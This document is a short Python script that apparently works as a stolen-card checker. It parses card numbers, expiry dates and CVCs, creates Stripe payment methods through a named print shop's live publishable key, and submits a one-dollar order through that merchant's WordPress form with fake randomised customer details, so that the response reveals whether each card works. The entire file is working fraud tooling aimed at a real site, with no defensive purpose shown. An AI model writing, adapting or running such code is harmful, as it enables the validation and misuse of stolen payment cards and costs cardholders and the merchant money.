import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ffcb1cc363c%3B+stripe-js-v3%2Ffcb1cc363c%3B+card-element&referrer=https%3A%2F%2Fwww.weprintitnow.com&time_on_page=105333&client_attribution_metadata[client_session_id]=934c7ba7-03f6-4d80-b6d1-2dba382fba7b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=c6f7f932-7405-47e8-88da-3eb9a550e7c6&key=pk_live_51QT6eDFtzybSIT2n1IlBWssiCralsgg5AQDn4k7Vvg7UMsK6gZmqJKkyHgSSdYifP4ZoX3uewYTVOEIqCvh8XXWl00zag4wf96'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '__stripe_mid': '2ecb66db-1dbb-4c74-93f9-05528dd282c69a50dd',
	    '__stripe_sid': '500ff2ca-30b1-4446-84f3-f072a838a85869b53a',
	}
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': '__stripe_mid=2ecb66db-1dbb-4c74-93f9-05528dd282c69a50dd; __stripe_sid=500ff2ca-30b1-4446-84f3-f072a838a85869b53a',
	    'Origin': 'https://www.weprintitnow.com',
	    'Referer': 'https://www.weprintitnow.com/order-prints/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    't': '1775769086526',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=914&_fluentform_3_fluentformnonce=729ae699e3&_wp_http_referer=%2Forder-prints%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser{random2}%40gmail.com&phone=%2B6681748063{random1}&dropdown=Circulars&payment_input=Test%20item%20-%20%241.00%20USD&address_1%5Baddress_line_1%5D=27%20Allen%20St&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10002&payment_method=stripe&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	response = requests.post(
	    'https://www.weprintitnow.com/wp-admin/admin-ajax.php',
	    params=params,
	    #cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
